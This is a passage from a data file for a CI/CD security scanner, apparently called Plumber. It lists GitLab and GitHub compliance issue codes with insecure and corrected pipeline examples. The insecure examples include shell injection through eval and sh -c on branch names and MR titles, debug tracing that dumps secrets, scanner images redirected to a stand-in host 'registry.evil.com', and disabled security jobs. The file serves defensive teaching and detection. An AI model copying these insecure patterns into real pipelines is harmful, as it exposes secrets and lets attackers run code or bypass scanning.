on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: pytest`,
      badExampleCaption: "UI shows 'test.yml' (filename) instead of a meaningful label.",
      goodExample: `# .github/workflows/test.yml — ✅ Named
name: Unit tests
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: pytest`,
      goodExampleCaption: "UI shows 'Unit tests'; status checks reference that name.",
      tips: [
        "Keep the name short and stable — branch protection rules reference it by exact string match.",
      ],
      status: "roadmap",
      relatedCodes: [],
    },
  },

  "ISSUE-502": {
    code: "ISSUE-502",
    gitlab: {
      title: "Merge request approval rule is below the minimum level of approvals required",
      category: "Access and Authorization",
      severity: "high",
      fixDuration: "quick",
      productScope: "platform",
      controlName: "MR approval rules must have at least N approvals required",
      controlConfigKey: "mrApprovalRulesMustHaveAtLeastNApprovals",
      description:
        "The merge request approval rule is configured with fewer approvers than the minimum required by your Policy controls.",
      impact:
        "Having insufficient approvals can lead to unreviewed code being merged, increasing the risk of introducing bugs, security vulnerabilities, or non-compliant changes.",
      remediation:
        "Increase the minimum number of approvals required in the merge request approval rule to meet or exceed the minimum number required by your Policy controls.",
      badExample: `# GitLab project settings — ❌ Insufficient approvals
# Settings > Merge requests > Approval rules:
#
#   Rule name: Security Team
#   Eligible approvers: Security Team (5 members)
#   Approvals required: 1   ← Below minimum (2 required by policy)`,
      badExampleCaption: "The approval rule requires only 1 approval, but the policy requires at least 2.",
      goodExample: `# GitLab project settings — ✅ Sufficient approvals configured
# Settings > Merge requests > Approval rules:
#
#   Rule name: Security Team
#   Eligible approvers: Security Team (5 members)
#   Approvals required: 2   ← Meets minimum requirement`,
      goodExampleCaption: "Approval rule meets the minimum number of required approvals.",
      tips: [
        "Set the minimum in your Plumber Platform policy under `mrApprovalRulesMustHaveAtLeastNApprovals.minimumApprovals`.",
        "Consider requiring different approval counts for different branch patterns (e.g., more for `main`).",
        "Combine with code owner approvals for critical areas of your codebase.",
      ],
      relatedCodes: ["ISSUE-503", "ISSUE-504"],
    },
  },

  "ISSUE-503": {
    code: "ISSUE-503",
    gitlab: {
      title: "Merge request approval settings are not compliant",
      category: "Access and Authorization",
      severity: "high",
      fixDuration: "quick",
      productScope: "platform",
      controlName: "MR approval settings must be compliant",
      controlConfigKey: "mrApprovalSettingsMustBeCompliant",
      description:
        "The current merge request approval settings do not align with your Policy controls.",
      impact:
        "Non-compliance with approval settings may lead to unreviewed code being merged, increasing the risk of introducing bugs, security vulnerabilities, or non-compliant changes.",
      remediation:
        "Update the merge request approval settings of the project to ensure compliance with your Policy controls.",
      badExample: `# GitLab project settings — ❌ Non-compliant approval settings
# Settings > Merge requests > Approvals:
#
#   Prevent approval by author:                  false ← Author can approve own MR
#   Prevent approvals by users who add commits:  false
#   Remove all approvals when commits are added: false
#
# These settings allow the MR author to approve their own changes,
# and approvals remain valid even after new commits are pushed.`,
      badExampleCaption: "Approval settings allow the author to approve their own MR and don't reset on new commits.",
      goodExample: `# GitLab project settings — ✅ Compliant approval settings
# Settings > Merge requests > Approvals:
#
#   Prevent approval by author:                  true
#   Prevent approvals by users who add commits:  true
#   Remove all approvals when commits are added: true`,
      goodExampleCaption: "Approval settings prevent self-approval and reset on new commits.",
      tips: [
        "Enable 'Prevent approval by author' to ensure code is reviewed by someone other than the author.",
        "'Remove all approvals when commits are added' ensures the latest changes are always reviewed.",
        "These settings can also be enforced at the group level for consistency.",
      ],
      relatedCodes: ["ISSUE-502", "ISSUE-504"],
    },
  },

  "ISSUE-504": {
    code: "ISSUE-504",
    gitlab: {
      title: "No merge request approval rule covering all protected branches",
      category: "Access and Authorization",
      severity: "high",
      fixDuration: "quick",
      productScope: "platform",
      controlName: "An MR approval rule must be defined to cover all protected branches",
      controlConfigKey: "mrApprovalRuleMustCoverAllProtectedBranches",
      description:
        "There is no merge request approval rule configured in the project that applies to all protected branches.",
      impact:
        "Without at least one approval rule for protected branches, they lack the necessary review process, increasing the likelihood of unauthorized or insecure changes being merged.",
      remediation:
        "Create a merge request approval rule in the project that covers all protected branches.",
      badExample: `# GitLab project settings — ❌ No approval rule for all branches
# Settings > Merge requests > Approval rules:
#
#   Rule: "QA Team"  → applies to: main
#   Rule: "Dev Team" → applies to: develop
#
# There is no rule that applies to ALL protected branches.
# Branches like release/* have no approval requirement.`,
      badExampleCaption: "No approval rule covers all protected branches — some branches can be merged without review.",
      goodExample: `# GitLab project settings — ✅ Approval rule covers all protected branches
# Settings > Merge requests > Approval rules:
#
#   Rule: "All Approvals" → applies to: All protected branches
#   Eligible approvers: Maintainers
#   Approvals required: 1`,
      goodExampleCaption: "An approval rule covering all protected branches ensures consistent review.",
      tips: [
        "Create one 'catch-all' rule that targets all protected branches as a baseline.",
        "You can add additional branch-specific rules on top of the catch-all rule.",
        "This control complements ISSUE-502 (minimum approvals) for a complete review policy.",
      ],
      relatedCodes: ["ISSUE-502", "ISSUE-503"],
    },
  },

  "ISSUE-407": {
    code: "ISSUE-407",
    gitlab: {
      title: "Invalid pipeline composition",
      category: "Pipeline Composition",
      severity: "high",
      fixDuration: "long",
      productScope: "platform",
      controlName: "Pipeline must include required phases",
      controlConfigKey: "pipelineMustIncludeRequiredPhases",
      description:
        "The project's CI pipeline does not include all the required actions defined by your configuration.",
      impact:
        "Missing actions in the pipeline can lead to unverified code being deployed. This increases the risk of security vulnerabilities, compliance issues, and software defects reaching production. For example, if security checks are absent, a vulnerable application can be deployed in production and lead to user data leak.",
      remediation:
        "Ensure that the CI pipeline includes all required validations as defined in your Policy controls.",
      badExample: `# .gitlab-ci.yml — ❌ Missing required pipeline phases
stages:
  - build
  - deploy
  # Missing: test, security-scan (required by policy)

build:
  stage: build
  script:
    - docker build -t $CI_REGISTRY_IMAGE .

deploy:
  stage: deploy
  script:
    - kubectl apply -f k8s/
  # Deploying without testing or security scanning!`,
      badExampleCaption: "The pipeline skips required test and security scan phases.",
      goodExample: `# .gitlab-ci.yml — ✅ All required phases present
stages:
  - build
  - test
  - security-scan
  - deploy

build:
  stage: build
  script:
    - docker build -t $CI_REGISTRY_IMAGE .

test:
  stage: test
  script:
    - pytest tests/

include:
  - component: gitlab.com/components/sast/sast@1.5.2

deploy:
  stage: deploy
  script:
    - kubectl apply -f k8s/`,
      goodExampleCaption: "All required pipeline phases are present before deployment.",
      tips: [
        "Define required pipeline phases in your Plumber Platform policy under `pipelineMustIncludeRequiredPhases.requiredPhases`.",
        "Use job name patterns to detect required phases across different pipeline implementations.",
        "Consider blocking deployments if required phases are missing using GitLab protected environments.",
      ],
      relatedCodes: ["ISSUE-405", "ISSUE-408"],
    },
  },

  "ISSUE-505": {
    code: "ISSUE-505",
    gitlab: {
      title: "Branch protection configuration not compliant",
      category: "Access and Authorization",
      severity: "high",
      fixDuration: "quick",
      controlName: "Branch must be protected",
      controlConfigKey: "branchMustBeProtected",
      description:
        "The branch protection configuration does not meet the security requirements defined in your Policy controls. The branch settings allow unauthorized access levels, force push capabilities, or bypass code owner approval requirements.",
      impact:
        "Non-compliant branch protection settings can lead to unauthorized code changes, security vulnerabilities, and compliance issues. This includes risks such as loss of commit history through force push, unauthorized code merges, and direct pushes to protected branches without proper validation.",
      remediation:
        "Update the branch protection settings to comply with your Policy controls requirements by enforcing proper access controls, disabling force push, and requiring code owner approvals for all changes.",
      badExample: `# GitLab settings — ❌ Protection exists but is too permissive
# Branch: main
#   Allowed to push: Developers + Maintainers  (too permissive)
#   Allow force push: Yes                       (dangerous)
#   Code owner approval required: No            (missing review)

# Required by .plumber.yaml:
#   minPushAccessLevel: 40 (Maintainer only)
#   allowForcePush: false
#   codeOwnerApprovalRequired: true`,
      badExampleCaption: "Branch is protected but settings don't meet requirements.",
      goodExample: `# GitLab settings — ✅ Protection meets requirements
# Branch: main
#   Allowed to merge: Developers + Maintainers
#   Allowed to push: Maintainers only
#   Allow force push: No
#   Code owner approval required: Yes

# Matches .plumber.yaml:
branchMustBeProtected:
  enabled: true
  allowForcePush: false
  codeOwnerApprovalRequired: true
  minMergeAccessLevel: 30
  minPushAccessLevel: 40`,
      goodExampleCaption: "Branch protection meets all configured requirements.",
      tips: [
        "Plumber checks each setting independently — the output shows exactly which settings are non-compliant.",
        "Access levels: 0 = No one, 30 = Developer, 40 = Maintainer.",
        "Force push should almost always be disabled on production branches.",
      ],
      relatedCodes: ["ISSUE-501"],
    },
    github: {
      title: "Branch protection configuration not compliant",
      category: "Access and Authorization",
      severity: "high",
      fixDuration: "quick",
      controlName: "Branch must be protected",
      controlConfigKey: "branchMustBeProtected",
      description:
        "A protected branch exists but the effective settings, after merging classic Branch Protection and every Repository or Organization Ruleset covering the branch, don't match the policy. Force-push may still be allowed, code-owner approval may be missing, or required status checks may be absent.",
      impact:
        "A protected-but-misconfigured branch creates a false sense of safety. Reviewers see the green check, the workflow runs, and the UI shows a protection rule, but a critical safeguard (force-push prevention, code-owner review, required checks) is disabled in practice.",
      remediation:
        "Update whichever source carries the offending setting (the classic rule, a Repository Ruleset, or an inherited Organization Ruleset) so the merged effective configuration matches `.plumber.yaml`. Each non-compliant setting is listed individually in Plumber's output so you know exactly what to change.",
      badExample: `# GitHub repo settings — ❌ Protection too permissive
# Settings > Rules > Rulesets > \`main\` ruleset:
#   Block force pushes: OFF        ← required by policy
#   Require pull request reviews: ON
#     Required approvals: 0        ← policy requires >= 1
#     Require review from Code Owners: OFF   ← required by policy
#
# .plumber.yaml
github:
  controls:
    branchMustBeProtected:
      enabled: true
      allowForcePush: false
      codeOwnerApprovalRequired: true
      minPullRequestReviews: 1`,
      badExampleCaption: "Ruleset exists but force-push is allowed and code-owner reviews are off.",
      goodExample: `# GitHub repo settings — ✅ Settings match policy
# Settings > Rules > Rulesets > \`main\` ruleset:
#   Block force pushes: ON
#   Require pull request reviews: ON
#     Required approvals: 1
#     Require review from Code Owners: ON`,
      goodExampleCaption: "Each policy setting has a matching ruleset toggle enabled.",
      tips: [
        "Plumber reports each non-compliant setting individually so you can see exactly what to change.",
        "Settings are checked against the merged effective configuration. A rule disabled in classic Branch Protection but enforced by a Ruleset is treated as enforced. Stricter wins.",
        "Force push should be disabled on every long-lived branch.",
        "`codeOwnerApprovalRequired` only takes effect when a `CODEOWNERS` file exists in the repository.",
      ],
      relatedCodes: ["ISSUE-501"],
    },
  },

  "ISSUE-506": {
    code: "ISSUE-506",
    gitlab: {
      title: "Merge request settings are not compliant",
      category: "Access and Authorization",
      severity: "medium",
      fixDuration: "quick",
      productScope: "platform",
      controlName: "MR settings must be compliant",
      controlConfigKey: "mrSettingsMustBeCompliant",
      description:
        "The merge request settings in the project do not comply with the defined configuration, such as incorrect merge methods or merge options.",
      impact:
        "Non-compliant merge request settings can lead to unauthorized code changes and security vulnerabilities.",
      remediation:
        "Update the merge request settings to comply with your Policy controls by ensuring proper merge methods and merge options.",
      badExample: `# GitLab project settings — ❌ Non-compliant MR settings
# Settings > Merge requests:
#
#   Merge method: Merge commit (policy requires: Fast-forward merge)
#   Squash commits: Not enforced (policy requires: Always squash)
#   Delete source branch: Not enforced
#
# These settings create merge commits that clutter history
# and allow inconsistent commit messages.`,
      badExampleCaption: "MR settings use merge commits and don't enforce squashing, violating the policy.",
      goodExample: `# GitLab project settings — ✅ Compliant MR settings
# Settings > Merge requests:
#
#   Merge method: Fast-forward merge
#   Squash commits: Always (required by policy)
#   Delete source branch: Enabled by default`,
      goodExampleCaption: "MR settings comply with the policy: fast-forward merge and always squash.",
      tips: [
        "Fast-forward merge keeps a linear history, making it easier to bisect and revert.",
        "Enforcing squash commits ensures each feature is represented as a single atomic commit.",
        "Check your Plumber Platform policy for the exact merge and squash settings required.",
      ],
      relatedCodes: ["ISSUE-502", "ISSUE-503"],
    },
  },

  "ISSUE-408": {
    code: "ISSUE-408",
    gitlab: {
      title: "Missing required component",
      category: "Pipeline Composition",
      severity: "high",
      fixDuration: "medium",
      controlName: "Pipelines must include components",
      controlConfigKey: "pipelineMustIncludeComponent",
      description:
        "A required GitLab catalog component, as defined in your Policy controls, is missing in the project pipeline.",
      impact:
        "Missing components result in non-compliant and insecure pipeline configurations. For example, if your pipeline is missing a security scan component, vulnerabilities might go undetected.",
      remediation:
        "Include the missing GitLab catalog component in the CI/CD pipeline configuration of the project.",
      badExample: `# .gitlab-ci.yml — ❌ Missing required SAST component
include:
  - component: gitlab.com/components/secret-detection/secret-detection@2.4.1
  # Missing: gitlab.com/components/sast/sast (required by policy)

# .plumber.yaml — Requires both SAST and secret detection
# pipelineMustIncludeComponent:
#   enabled: true
#   required: components/sast/sast AND components/secret-detection/secret-detection`,
      badExampleCaption: "The SAST component is required but missing from the pipeline.",
      goodExample: `# .gitlab-ci.yml — ✅ All required components included
include:
  - component: gitlab.com/components/sast/sast@1.5.2
  - component: gitlab.com/components/secret-detection/secret-detection@2.4.1`,
      goodExampleCaption: "Both required components are included.",
      tips: [
        "Use expression syntax (`AND`/`OR`) in `required` for complex rules: `(sast AND secret-detection) OR full-security`.",
        "Alternatively, use `requiredGroups` with arrays for OR-of-ANDs logic.",
        "The `include` must match the component path pattern — check your `.plumber.yaml` for the exact paths.",
      ],
      relatedCodes: ["ISSUE-409", "ISSUE-405"],
    },
  },

  "ISSUE-409": {
    code: "ISSUE-409",
    gitlab: {
      title: "Forbidden override of required component",
      category: "Pipeline Composition",
      severity: "medium",
      fixDuration: "medium",
      controlName: "Pipelines must include components",
      controlConfigKey: "pipelineMustIncludeComponent",
      description:
        "A required GitLab catalog component, as defined in your Policy controls, has been overridden in the project pipeline. The following CI/CD keywords are detected as overrides: `after_script`, `allow_failure`, `artifacts`, `before_script`, `cache`, `coverage`, `dast_configuration`, `dependencies`, `environment`, `identity`, `image`, `inherit`, `interruptible`, `manual_confirmation`, `needs`, `pages`, `parallel`, `release`, `resource_group`, `retry`, `rules`, `script`, `secrets`, `services`, `stage`, `tags`, `timeout`, `trigger`, `when`.",
      impact:
        "Overriding required components can lead to non-compliant and insecure pipelines. For example, overriding a security scan component might bypass mandatory security checks.",
      remediation:
        "Remove overrides from the project CI/CD configuration. If overrides are relevant, include them in the required component or create a new one.",
      badExample: `# .gitlab-ci.yml — ❌ Overrides the SAST component's script
include:
  - component: gitlab.com/components/sast/sast@1.5.2

# This overrides the SAST job, potentially disabling the scanner
sast:
  script:
    - echo "SAST scan skipped"
  variables:
    SAST_EXCLUDED_PATHS: "**/*"`,
      badExampleCaption: "The SAST job is overridden, effectively disabling the security scan.",
      goodExample: `# .gitlab-ci.yml — ✅ Uses component inputs, no overrides
include:
  - component: gitlab.com/components/sast/sast@1.5.2
    inputs:
      stage: test

# No local overrides on the sast job
# Customization is done through component inputs only`,
      goodExampleCaption: "The component is included and configured through its official inputs.",
      tips: [
        "Check the component's documentation for available input variables.",
        "Variables can usually be set globally without overriding the job itself.",
        "If you need to customize behavior not covered by inputs, consider forking the component.",
      ],
      relatedCodes: ["ISSUE-408", "ISSUE-406"],
    },
  },

  "ISSUE-507": {
    code: "ISSUE-507",
    gitlab: {
      title: "Members' role quotas are not respected for projects",
      category: "Access and Authorization",
      severity: "medium",
      fixDuration: "medium",
      productScope: "platform",
      controlName: "Number of project members must respect a quota",
      controlConfigKey: "numberOfProjectMembersMustRespectQuota",
      description:
        "The number of members assigned to specific roles in a GitLab project does not respect the quotas defined in your Policy controls.",
      impact:
        "Ignoring role quotas can lead to uncontrolled access to project resources, weakening security and governance policies. For example, if too many users are assigned as Owners or Maintainers, it increases the risk of unauthorized changes and security misconfigurations.",
      remediation:
        "Review and adjust the members' role assignments in the project to comply with the defined quotas. Ensure that only the necessary members have privileges.",
      badExample: `# GitLab project members — ❌ Too many Maintainers
# Settings > Members:
#
#   alice  → Owner
#   bob    → Maintainer
#   carol  → Maintainer
#   dave   → Maintainer
#   eve    → Maintainer    ← 4 Maintainers (max allowed: 2)`,
      badExampleCaption: "The project has 4 maintainers, exceeding the allowed quota of 2.",
      goodExample: `# GitLab project members — ✅ Quotas respected
# Settings > Members:
#
#   alice  → Owner
#   bob    → Maintainer
#   carol  → Maintainer
#   dave   → Developer    ← Downgraded to meet quota
#   eve    → Developer    ← Downgraded to meet quota`,
      goodExampleCaption: "Member roles are adjusted to meet the defined quota.",
      tips: [
        "Regularly audit project members and their roles using GitLab's member management page.",
        "Use GitLab groups to manage access at scale instead of adding individual project members.",
        "Follow the principle of least privilege: grant members the minimum role needed for their tasks.",
      ],
      relatedCodes: ["ISSUE-508"],
    },
  },

  "ISSUE-103": {
    code: "ISSUE-103",
    gitlab: {
      title: "Container image is not pinned by digest",
      category: "CI/CD Container Images",
      severity: "high",
      fixDuration: "medium",
      controlName: "Container images must be pinned by digest",
      controlConfigKey: "containerImagesMustBePinnedByDigest",
      productScope: "cli",
      description:
        "When digest pinning is enabled in your configuration, every container image must be referenced by its SHA256 digest (`image@sha256:...`). This image is using a tag reference instead.",
      impact:
        "Even specific version tags (e.g., `python:3.12.1`) can be reassigned to a different image. Digest pinning is the only way to guarantee the exact image content used in your pipeline, providing the strongest supply chain security.",
      remediation:
        "Replace the tag reference with a digest reference. You can find the digest using `docker inspect` or `crane digest`.",
      badExample: `# .gitlab-ci.yml — ❌ Uses tag reference (not pinned by digest)
build:
  image: python:3.12.1
  script:
    - python setup.py build`,
      badExampleCaption: "Even specific version tags can be reassigned to a different image.",
      goodExample: `# .gitlab-ci.yml — ✅ Pinned by SHA256 digest
build:
  image: python@sha256:1c5313e4a18...f4b8e
  script:
    - python setup.py build

# Find the digest with:
#   docker pull python:3.12.1
#   docker inspect --format='{{index .RepoDigests 0}}' python:3.12.1
# Or:
#   crane digest python:3.12.1

# .plumber.yaml
controls:
  containerImagesMustBePinnedByDigest:
    enabled: true`,
      goodExampleCaption: "SHA256 digest ensures the exact image content is always used.",
      tips: [
        "Enable digest pinning in `.plumber.yaml` with `containerImagesMustBePinnedByDigest: true`.",
        "Use `crane digest <image>:<tag>` (from `go-containerregistry`) for a quick digest lookup.",
        "Consider automating digest updates with tools like Renovate or Dependabot.",
      ],
      relatedCodes: ["ISSUE-101", "ISSUE-102"],
    },
  },

  "ISSUE-203": {
    code: "ISSUE-203",
    gitlab: {
      title: "Pipeline enables CI debug trace",
      category: "CI/CD Variables",
      severity: "critical",
      fixDuration: "quick",
      controlName: "Pipeline must not enable debug trace",
      controlConfigKey: "pipelineMustNotEnableDebugTrace",
      productScope: "cli",
      description:
        "The pipeline enables `CI_DEBUG_TRACE` or `CI_DEBUG_SERVICES`, which causes GitLab CI to print all environment variables, including secrets, in the job logs.",
      impact:
        "**This is a critical security vulnerability.** When debug trace is enabled, every secret variable (API tokens, passwords, deployment keys) is printed in plain text in the job logs. These logs may be accessible to anyone with repository access.",
      remediation:
        "Remove `CI_DEBUG_TRACE` and `CI_DEBUG_SERVICES` from your pipeline configuration. These should only be used temporarily for local debugging and must never be committed.",
      badExample: `# .gitlab-ci.yml — ❌ Debug trace enabled (CRITICAL)
variables:
  CI_DEBUG_TRACE: "true"    # Exposes ALL secrets in logs!

deploy:
  stage: deploy
  variables:
    CI_DEBUG_SERVICES: "true"  # Also exposes secrets
  script:
    - deploy.sh`,
      badExampleCaption: "All secret variables will be printed in plain text in job logs.",
      goodExample: `# .gitlab-ci.yml — ✅ Debug trace removed
variables:
  # CI_DEBUG_TRACE removed

deploy:
  stage: deploy
  script:
    - deploy.sh

# For debugging, use these safer alternatives:
#   - Add specific echo/print statements
#   - Use 'set -x' for specific script sections only
#   - Run a debug pipeline with limited access`,
      goodExampleCaption: "No debug trace — secrets remain protected.",
      tips: [
        "If you need to debug a CI job, use `set -x` in specific script lines instead of `CI_DEBUG_TRACE`.",
        "If debug trace was ever enabled, **rotate all secrets** that may have been exposed in logs.",
        "Configure `pipelineMustNotEnableDebugTrace.forbiddenVariables` to also flag other sensitive debug variables.",
        "Consider setting up CI job log retention policies to limit exposure window.",
      ],
      relatedCodes: ["ISSUE-201", "ISSUE-202", "ISSUE-301"],
    },
    github: {
      title: "Workflow enables runner debug logging",
      category: "CI/CD Variables",
      severity: "critical",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Pipeline must not enable debug trace",
      controlConfigKey: "pipelineMustNotEnableDebugTrace",
      description:
        "Committed workflow YAML enables runner debug logging via static `env:` (workflow/job/step, merged per job): literal truthy values (`true`, `1`, `yes`), GitHub expressions on forbidden names (cannot prove off statically), or `run:` lines that write a forbidden name to `$GITHUB_ENV`. When either toggle is on at run time, the runner prints environment variables and internal SDK calls into the job log and bypasses masking for that dump. Org/repo Variables with no YAML reference and UI-only \"Re-run with debug logging\" are out of scope.",
      impact:
        "Every secret the workflow can read becomes visible to anyone with `actions: read` on the repository, plus to anyone who can download the log artefact (GitHub retains logs for 90 days by default). The exposure window for organisation-wide secrets, deploy tokens, and OIDC-minted cloud credentials starts the moment the run completes and lasts as long as the log is retained.",
      remediation:
        "Remove `ACTIONS_STEP_DEBUG` and `ACTIONS_RUNNER_DEBUG` from every `env:` block in the workflow file (workflow-level, job-level, and step-level). For per-run diagnostics, set the variables in the GitHub UI under `Actions → Re-run with debug logging` so they apply to a single re-run and never get committed.",
      badExample: `# .github/workflows/ci.yml — ❌ Runner debug logging committed
name: ci
on: [push]
env:
  ACTIONS_STEP_DEBUG: "true"     # exposes every secret in the job log
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: ./build.sh`,
      badExampleCaption: "Workflow-level env is merged into every job; secret-bearing steps print their values verbatim.",
      goodExample: `# .github/workflows/ci.yml — ✅ No debug toggles in the workflow file
name: ci
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: ./build.sh

# .plumber.yaml
github:
  controls:
    pipelineMustNotEnableDebugTrace:
      enabled: true
      forbiddenVariables:
        - ACTIONS_STEP_DEBUG
        - ACTIONS_RUNNER_DEBUG`,
      goodExampleCaption: "Re-enable per-run only via GitHub's UI; never commit the toggles.",
      tips: [
        "Literal `env:` truthy values and `${{ }}` bindings on forbidden names are both flagged. `run:` steps that write a forbidden name to `$GITHUB_ENV` are flagged too.",
        "Workflow-, job-, and step-level `env:` are all scanned (merged into each job). A workflow-level toggle produces one finding per affected job.",
        "A `run:` line that writes a forbidden name to `$GITHUB_ENV` without using that exact name in the script text (e.g. via a shell variable) is out of scope.",
        "If either toggle ever shipped to main, rotate every secret the affected workflow could read. Extend `forbiddenVariables` for custom runner diagnostics.",
      ],
      status: "shipping",
      relatedCodes: ["ISSUE-301", "ISSUE-213"],
    },
  },

  "ISSUE-204": {
    code: "ISSUE-204",
    gitlab: {
      title: "Unsafe variable expansion",
      category: "CI/CD Variables",
      severity: "medium",
      fixDuration: "medium",
      controlName: "Pipeline must not use unsafe variable expansion",
      controlConfigKey: "pipelineMustNotUseUnsafeVariableExpansion",
      productScope: "cli",
      description:
        "A user-controlled CI variable (MR title, commit message, branch name) is expanded in a shell re-interpretation context such as `eval`, `sh -c`, `bash -c`, or `source`. The expanded value is executed as code, enabling command injection.",
      impact:
        "An attacker can craft a branch name, MR title, or commit message to inject arbitrary commands into your pipeline. This is a direct path to secret exfiltration, source code theft, and supply chain compromise. Maps to OWASP CICD-SEC-1 (Insufficient Flow Control).",
      remediation:
        "Avoid passing user-controlled variables to commands that re-interpret input as shell code. Use the variable in a safe context (e.g., `echo`, environment variable assignment) or add the script line to `allowedPatterns` in `.plumber.yaml` if the usage is intentional and safe.",
      badExample: `# .gitlab-ci.yml — ❌ Variables in shell re-interpretation contexts
deploy:
  script:
    - eval "deploy --branch $CI_COMMIT_BRANCH"

notify:
  script:
    - sh -c "echo Deploying $CI_MERGE_REQUEST_TITLE"

release:
  script:
    - bash -c "tag=$CI_COMMIT_REF_NAME; push_release $tag"`,
      badExampleCaption: "User-controlled variables are passed to eval, sh -c, and bash -c, enabling command injection.",
      goodExample: `# .gitlab-ci.yml — ✅ Variables used in safe contexts
deploy:
  script:
    - deploy --branch "$CI_COMMIT_BRANCH"

notify:
  script:
    - echo "Deploying $CI_MERGE_REQUEST_TITLE"

release:
  script:
    - push_release "$CI_COMMIT_REF_NAME"

# If you have legitimate sh -c usage, allow it in .plumber.yaml:
# pipelineMustNotUseUnsafeVariableExpansion:
#   allowedPatterns:
#     - "helm.*--set.*\\\\$CI_"
#     - "terraform workspace select.*\\\\$CI_"`,
      goodExampleCaption: "Variables are used directly in shell commands without re-interpretation.",
      tips: [
        "Normal shell expansion (`echo $CI_COMMIT_BRANCH`) is safe. Only re-interpretation contexts (`eval`, `sh -c`, `bash -c`, `source`) are flagged.",
        "Use `allowedPatterns` (regex) to suppress specific findings for legitimate usages like Helm or Terraform.",
        "Escape `$` as `\\\\$` and `{`/`}` as `\\\\{`/`\\\\}` in `allowedPatterns` regex.",
        "Indirect aliasing (`variables: { B: $CI_COMMIT_BRANCH }` then `sh -c $B`) is not tracked (known limitation).",
      ],
      relatedCodes: ["ISSUE-203", "ISSUE-301"],
    },
  },

  "ISSUE-205": {
    code: "ISSUE-205",
    gitlab: {
      title: "Job variable overrides controlled variable",
      category: "CI/CD Variables",
      severity: "high",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Pipeline must not override job variables",
      controlConfigKey: "pipelineMustNotOverrideJobVariables",
      description:
        "A CI/CD variable that should only be set in GitLab CI/CD Settings (as a protected or project-level variable) is redefined in the pipeline configuration file (`.gitlab-ci.yml`). This control inspects only the raw user-authored YAML, so variables defined inside included templates or components are not flagged.",
      impact:
        "An attacker who can modify `.gitlab-ci.yml` could override variables like `SECURE_ANALYZERS_PREFIX` to point to a fake registry, or set `SAST_DISABLED: \"true\"` to silently disable security scanners. The pipeline still appears green, but no actual scanning occurs. This applies to any variable the organization considers controlled, not just security-related ones.",
      remediation:
        "Remove the variable from `.gitlab-ci.yml` (both global `variables:` and per-job `variables:` blocks) and set it in **GitLab CI/CD Settings > Variables** instead. Configure the list of controlled variables in `.plumber.yaml` under `pipelineMustNotOverrideJobVariables.variables`.",
      badExample: `# .gitlab-ci.yml — ❌ Controlled variables defined in the YAML
variables:
  SECURE_ANALYZERS_PREFIX: "registry.evil.com/scanners"
  SAST_DISABLED: "true"

build:
  image: golang:1.22
  variables:
    SECRET_DETECTION_DISABLED: "true"
    SAST_EXCLUDED_PATHS: "**/*"
  script:
    - go build ./...`,
      badExampleCaption: "Controlled variables are redefined in .gitlab-ci.yml, bypassing CI/CD Settings.",
      goodExample: `# .gitlab-ci.yml — ✅ No controlled variables in the YAML
variables:
  GOPROXY: "https://proxy.golang.org,direct"

build:
  image: golang:1.22
  script:
    - go build ./...

# In GitLab: Settings > CI/CD > Variables
# Add: SECURE_ANALYZERS_PREFIX, SAST_DISABLED, etc.
# Set Protected: true, Masked: false (or true if appropriate)

# .plumber.yaml
# pipelineMustNotOverrideJobVariables:
#   enabled: true
#   variables:
#     - SECURE_ANALYZERS_PREFIX
#     - SAST_DISABLED
#     - SECRET_DETECTION_DISABLED
#     - SAST_EXCLUDED_PATHS`,
      goodExampleCaption: "Controlled variables are managed in GitLab CI/CD Settings, not in the YAML.",
      tips: [
        "The control checks the raw user-authored `.gitlab-ci.yml` only. Variables defined by included components or templates are not flagged.",
        "Variable name matching is case-insensitive: `sast_disabled` and `SAST_DISABLED` are both detected.",
        "Any value triggers the issue, even `\"false\"`. The variable should not be defined in the YAML at all.",
        "Use this control for any variable your organization considers controlled, not just security-related ones.",
        "Default controlled variables cover common GitLab security scanner variables (`SECURE_ANALYZERS_PREFIX`, `SAST_DISABLED`, `CONTAINER_SCANNING_DISABLED`, etc.).",
      ],
      relatedCodes: ["ISSUE-203", "ISSUE-204", "ISSUE-410"],
    },
  },

  "ISSUE-410": {
    code: "ISSUE-410",
    gitlab: {
      title: "Security job weakened",
      category: "Pipeline Composition",
      severity: "critical",
      fixDuration: "quick",
      controlName: "Security jobs must not be weakened",
      controlConfigKey: "securityJobsMustNotBeWeakened",
      productScope: "cli",
      description:
        "A security scanning job (SAST, Secret Detection, Container Scanning, Dependency Scanning, DAST, License Scanning) has been weakened by overriding its configuration in `.gitlab-ci.yml`. The pipeline still includes the security template but the actual scanning is neutralized.",
      impact:
        "Weakened security jobs give a false sense of compliance. The pipeline appears to include security scanning, but the scans either never run, require manual intervention, or silently ignore failures. Maps to OWASP CICD-SEC-4 (Poisoned Pipeline Execution).",
      remediation:
        "Remove the override that weakens the security job. Security jobs should run automatically on every pipeline and block the pipeline on failure.",
      badExample: `# .gitlab-ci.yml — ❌ Security jobs are weakened
include:
  - template: Security/SAST.gitlab-ci.yml
  - template: Security/Secret-Detection.gitlab-ci.yml

# Weakened: failures are silently ignored
semgrep-sast:
  allow_failure: true

# Weakened: job will never run
secret_detection:
  rules:
    - when: never

# Weakened: job only runs if manually triggered
container_scanning:
  when: manual`,
      badExampleCaption: "Security jobs are present but neutralized through allow_failure, rules override, and when: manual.",
      goodExample: `# .gitlab-ci.yml — ✅ Security jobs run as intended
include:
  - template: Security/SAST.gitlab-ci.yml
  - template: Security/Secret-Detection.gitlab-ci.yml
  - template: Security/Container-Scanning.gitlab-ci.yml

# No local overrides — security jobs run as designed by the templates
# Customization is done through CI/CD variables:
variables:
  SAST_EXCLUDED_PATHS: "test/**"
  SECRET_DETECTION_HISTORIC_SCAN: "false"

# .plumber.yaml
# securityJobsMustNotBeWeakened:
#   enabled: true
#   securityJobPatterns:
#     - "*-sast"
#     - "secret_detection"
#     - "container_scanning"
#     - "*_dependency_scanning"
#     - "dast"
#     - "dast_*"
#     - "license_scanning"
#   allowFailureMustBeFalse:
#     enabled: false   # opt-in (GitLab templates ship with allow_failure: true)
#   rulesMustNotBeRedefined:
#     enabled: true
#   whenMustNotBeManual:
#     enabled: true`,
      goodExampleCaption: "Security templates are included without overrides. Configuration is done via variables.",
      tips: [
